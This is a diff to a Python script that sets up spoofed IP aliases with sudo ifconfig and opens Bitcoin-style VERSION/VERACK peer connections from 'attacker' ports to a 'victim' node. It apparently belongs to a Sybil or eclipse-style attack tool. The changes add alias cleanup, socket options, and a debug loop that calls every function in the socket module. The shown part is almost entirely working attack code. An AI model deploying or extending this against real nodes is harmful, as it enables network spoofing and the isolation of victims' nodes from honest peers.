@@ -51,16 +51,12 @@ def get_interface():
 network_interface = get_interface()
 
 def ip_alias(ip_address):
-	print(f'Setting up IP alias {ip_address}')
 	global alias_num
+	print(f'Setting up IP alias {ip_address}')
+	alias_num += 1
 	interface = f'{network_interface}:{alias_num}'
 	terminal(f'sudo ifconfig {interface} {ip_address} up')
-	alias_num += 1
 	return interface
-
-def remove_ip_alias(interface, ip):
-	print(f'Removing IP alias {ip} on {interface}')
-	terminal(f'sudo ifconfig {interface} {ip} down')
 
 def random_ip():
 	#return f'10.0.4.4'#{str(random.randint(0, 255))}'
@@ -97,42 +93,57 @@ def initialize_fake_connection(src_ip, dst_ip):
 	##########
 	src_port = attacker_port
 	dst_port = victim_port
-	print(f'Spoofing with IP {src_ip}:{src_port} to IP {dst_ip}:{dst_port}')
+	print(f'Spoofing with IP ({src_ip} : {src_port}) to IP ({dst_ip} : {dst_port})...')
 
 	spoof_interface = ip_alias(src_ip)
+	spoof_IP_interface.append((spoof_interface, src_ip))
 	print(f'Successfully set up IP alias on interface {spoof_interface} (see ifconfig)')
-	print(terminal('ifconfig'))
 
 	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	
+	#if not hasattr(s,'SO_BINDTODEVICE') :
+	#	socket.SO_BINDTODEVICE = 25
+
+	print(f'Setting socket network interface to "{spoof_interface}"...')
+	#s.setsockopt(socket.SOL_SOCKET, socket.SO_BINDTODEVICE, str(spoof_interface[:16] + '\0').encode('utf-8'))
+	s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+	
+	print(f'Binding ({src_ip} : {src_port}) to socket...')
 	s.bind((src_ip, src_port))
-	print(f'Successfully binded {src_ip}:{src_port} to socket.')
+
+	for a in dir(socket):
+		try:
+			print(f'{a}() = {getattr(socket,a)()}')
+		except:
+			pass
+	
+	print(f'Connecting socket to ({dst_ip} : {dst_port})...')
 	s.connect((dst_ip, dst_port))
 
 	# Send version packet
+	print('\nSending VERSION packet')
 	version = version_packet(src_ip, dst_ip, src_port, dst_port)
 	print(version)
-
 	s.send(version.to_bytes())
+
 	# Get verack packet
-	print('\n\n*** ')
+	print('\nReceiving VERACK packet')
 	print(s.recv(1924)) # Next message received must be <= 1924 bytes
 	# Send verack packet
-	print('Received version response')
+	print('Received VERACK response')
 
+	print('\nSending VERACK packet')
 	verack = msg_verack()
 	print(verack)
 	s.send(verack.to_bytes())
 	# Get verack packet
-	print('\n\n*** ')
+	print('\nReceiving VERACK packet')
 	print(s.recv(1024)) # Next message received must be <= 1024 bytes
-
-	print('Received verack response')
 
 	spoof_IP_and_ports.append((src_ip, src_port))
 	spoof_IP_sockets.append(s)
-	spoof_IP_interface.append((spoof_interface, src_ip))
 
-	print('\n\n*** ')
+	print('\n\n')
 	print('CONNECTION ESTABLISHED')
 
 	#time.sleep(5)
@@ -214,18 +225,23 @@ def backup_iptables():
 
 def cleanup_iptables():
 	if(os.path.exists(iptables_file_path)):
-		print('Cleaning up iptables...')
+		print('Cleaning up iptables configuration')
 		terminal(f'iptables-restore < {iptables_file_path}')
 		os.remove(iptables_file_path)
+
+def cleanup_ipaliases():
+	for alias in spoof_IP_interface:
+		interface, ip = alias
+		print(f'Cleaning up IP alias {ip} on {interface}')
+		terminal(f'sudo ifconfig {interface} {ip} down')
 
 # Ran when the script ends
 def on_close():
 	for socket in spoof_IP_sockets:
 		print(f'CLOSING SOCKET {socket}')
 		socket.close()
+	cleanup_ipaliases()
 	cleanup_iptables()
-	for alias in spoof_IP_interface:
-		remove_ip_alias(alias[0], alias[1])
 	print('Goodbye.')
 
 
